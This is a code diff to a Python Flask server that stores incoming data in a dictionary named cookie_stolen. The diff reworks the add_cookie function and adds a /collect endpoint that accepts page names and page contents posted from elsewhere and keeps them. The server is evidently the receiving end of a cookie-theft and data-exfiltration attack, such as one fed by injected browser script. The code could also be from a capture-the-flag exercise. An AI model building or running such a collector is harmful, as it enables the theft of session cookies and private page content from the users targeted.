@@ -14,19 +14,19 @@ cookie_stolen = {}
 
 def add_cookie(cookie):
     print(f"Adding cookie: {cookie}, {type(cookie)=}")
+    key = "AUTOGEN" + uuid.uuid4().hex
     if type(cookie) is dict:
-        print(f"normal {cookie.key=} {cookie.value=}")
-        cookie_stolen[cookie.key] = cookie.value
+        print(f"normal")
+        cookie_stolen[key] = cookie
     elif type(cookie) is ImmutableMultiDict:
         print(f"werkzeug {cookie.keys()=} {cookie.values()=} {cookie.items()=}")
-        key = "AUTOGEN" + uuid.uuid4().hex
         cookie_item: dict[str, str] = dict()
         for k, v in cookie.items():
             print(f"adding {k}={v}")
             cookie_item[k] = str(v)
         cookie_stolen[key] = cookie_item
     else:
-        key = "AUTOGEN" + uuid.uuid4().hex
+        print("else")
         cookie_item: dict[str, str] = dict(
             item.split("=", 1) for item in cookie.split("; ")
         )
@@ -59,6 +59,19 @@ def receive_image(img):
     redirection = redirect(request.referrer or url_for('www.google.com'))  # oui j'ai stressé pour le www.google.com
     response = make_response(redirection)
     return response
+
+
+@app.route("/collect", methods=["POST"])
+def collect():
+    print(f"/collect")
+
+    page = request.form.get("page")
+    content = request.form.get("content").strip()
+
+    print(f"{page=}")
+    print(f"{content=}")
+    add_cookie({page: content})
+    return "", 204
 
 
 @app.route('/')
